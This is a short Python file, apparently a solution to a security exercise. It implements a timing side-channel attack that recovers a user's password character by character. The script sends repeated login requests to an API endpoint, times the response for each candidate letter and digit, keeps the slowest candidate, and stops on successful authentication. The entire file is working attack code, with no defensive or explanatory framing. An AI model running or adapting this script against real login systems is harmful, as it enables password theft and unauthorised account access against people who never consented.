import operator
import string
from api_requests import post_timing_sidechannel

def handle_timing_sidechannel(assignment, api_endpoint):
    # value that set the number of runs for each character of the password
    runs = 10
    user = assignment["user"]
    alphabet = list(string.ascii_letters + string.digits)
    password = ""
    mask = ['a']
    known_chars = 0
    dict  = {}
    while True:
        for j in range(runs):
            for i in alphabet:
                if len(mask) <= known_chars + 1:
                    mask.append(i)
                else:
                    mask[known_chars] = i
                result = post_timing_sidechannel(user, "".join(mask), api_endpoint)
                time = result["time"]
                if j == 0:
                    test = post_timing_sidechannel(user, (password + i), api_endpoint)
                    if test["status"] == "auth_success":
                        return {"password": password + i}
                if i in dict:
                    dict[i] += time
                else:
                    dict[i] = time
        highest_key = max(dict.items(), key=operator.itemgetter(1))[0]
        password += highest_key
        mask[known_chars] = highest_key
        dict = {}
        known_chars += 1
